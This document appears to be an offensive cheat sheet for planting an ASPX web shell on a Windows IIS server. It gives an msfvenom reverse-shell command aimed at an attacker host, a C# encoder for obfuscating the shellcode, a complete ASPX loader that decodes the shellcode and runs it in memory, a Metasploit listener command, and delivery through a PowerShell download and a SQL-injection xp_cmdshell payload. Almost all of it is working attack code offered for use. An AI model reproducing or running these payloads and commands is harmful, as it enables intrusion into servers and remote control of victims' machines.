# ASPX

### 1) Craft payload

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=443 -f aspx -o pay.aspx

### 2) Encode the shellcode part of your payload using Caesar encryptor from a C# Console App below

    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    
    namespace CaesarEncrypt
    {
        class Program
        {
            static void Main(string[] args)
            {
                // INSERT SHELLCODE HERE
                byte[] buf = new byte[685]
                {
                    shellcodeHere
                };
                byte[] encoded = new byte[buf.Length];
                for (int i = 0; i < buf.Length; i++)
                {
                    encoded[i] = (byte)(((uint) buf[i] + 5) & 0xFF);
                }
                StringBuilder hex = new StringBuilder(encoded.Length * 2);
                foreach(byte b in encoded)
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }
                Console.WriteLine("The payload is: " + hex.ToString());
            }
        }
    }

### 3) Insert shellcode below

    < % @ Page Language = "C#"
    AutoEventWireup = "true" % > < % @ Import Namespace = "System.IO" % > < script runat = "server" > private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr) 0x40;
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);
    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();
    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }
        byte[] oe7hnH0 = new byte[685]
        {
            shellcodeHere
        };
        for (int i = 0; i < oe7hnH0.Length; i++)
        {
            oe7hnH0[i] = (byte)(((uint) oe7hnH0[i] - 5) & 0xFF);
        }
        IntPtr uKVv = VirtualAlloc(IntPtr.Zero, (UIntPtr) oe7hnH0.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(oe7hnH0, 0, uKVv, oe7hnH0.Length);
        IntPtr xE34tIARlB = IntPtr.Zero;
        IntPtr iwuox = CreateThread(IntPtr.Zero, UIntPtr.Zero, uKVv, IntPtr.Zero, 0, ref xE34tIARlB);
    } < /script>

### 4) Setup listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [Attacker_IP]; set lport 443; exploit"

### 5) Upload it to the server and then find a way to trigger it in the web server

Usually an upload functionality that after uploading allow us to see the files

PowerShell Download

    iwr -uri http://[ATTACKER_IP]/[NAME].aspx -o C:\inetpub\wwwroot\[PAYLOAD_NAME].aspx

SQL Injection RCE

    '; EXEC master.dbo.xp_cmdshell "powershell.exe iwr -uri http://[ATTACKER_IP]/[NAME].aspx -o C:\inetpub\wwwroot\[PAYLOAD_NAME].aspx";--
